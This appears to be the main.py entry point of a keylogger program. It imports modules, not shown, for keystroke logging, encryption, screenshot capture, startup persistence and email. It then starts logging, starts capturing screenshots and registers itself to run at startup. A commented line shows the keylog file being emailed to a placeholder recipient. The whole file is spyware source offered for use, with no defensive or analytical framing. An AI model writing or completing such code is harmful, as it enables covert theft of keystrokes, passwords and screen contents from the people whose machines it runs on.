# main.py
from logger import start_keylogger
from encryption import generate_key, encrypt_data
from screenshot import start_screenshot_thread
from persistence import add_to_startup
from emailer import send_email

def main():
    key = generate_key()  # Generate encryption key
    
    # Start keylogging
    start_keylogger(encrypt_function=encrypt_data, key=key)
    
    # Start screenshot capture
    start_screenshot_thread()
    
    # Add to startup
    add_to_startup()
    
    # Periodically send emails with the logs (this can be in a separate thread or timer)
    # Example: send_email("keylog.txt", key, "recipient_email@example.com")

if __name__ == "__main__":
    main()
